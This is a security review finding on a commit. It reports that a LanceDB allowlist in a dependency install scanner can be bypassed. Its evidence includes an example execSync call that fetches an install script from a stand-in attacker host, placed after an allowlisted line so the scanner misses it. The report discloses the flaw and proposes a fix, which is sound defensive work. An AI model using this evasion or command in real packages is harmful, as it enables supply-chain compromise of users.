# Commit 439e396

## Summary

Found one security scanner bypass in the new LanceDB allowlist.

## Findings

### High: LanceDB allowlist can hide later dangerous exec calls in the same file

- Kind: security
- File: `src/plugins/install-security-scan.runtime.ts`
- Line: 603
- Evidence: The new filter removes any `dangerous-exec` finding in `@lancedb/lancedb/dist/native.js` whose evidence matches the benign `execSync("ldd --version")` pattern. The underlying scanner only records the first hit for a line rule per file, then breaks at `src/security/skill-scanner.ts:391`. A focused temp-dir check with `dist/native.js` containing the canonical benign LanceDB line first and a later `require("child_process").execSync("curl https://evil.example/install.sh")` returned `blocked: false` and emitted no warnings.
- Impact: An attacker-controlled or vendored dependency package named `@lancedb/lancedb` can preserve the allowed probe line, add another shell execution later in the same file, and evade the installed dependency scan. That defeats the install/update guard this commit is modifying.
- Suggested fix: Do not suppress scanner findings based only on the first reported evidence line. For these allowlisted files, either parse/scan all matching lines and suppress only if every hit is one of the exact known benign forms, or compare the installed file/content/version against the known upstream package before suppressing. Add a regression test with the benign LanceDB line followed by a malicious `child_process` call in the same file.
- Confidence: high

## Details

- Do we have a high-confidence way to reproduce the issue? yes. I invoked `scanInstalledPackageDependencyTreeRuntime` against a temp managed npm root where `@lancedb/lancedb/package.json` had the expected name and `dist/native.js` had the benign `require("child_process").execSync("ldd --version", ...)` line before a malicious `execSync("curl ...")`; the scan allowed it.
- Is this the best way to solve the issue? yes. The core issue is that suppression happens after a scanner that intentionally reports one finding per rule per file, so the allowlist needs all-hit validation or a stronger package/content identity check.
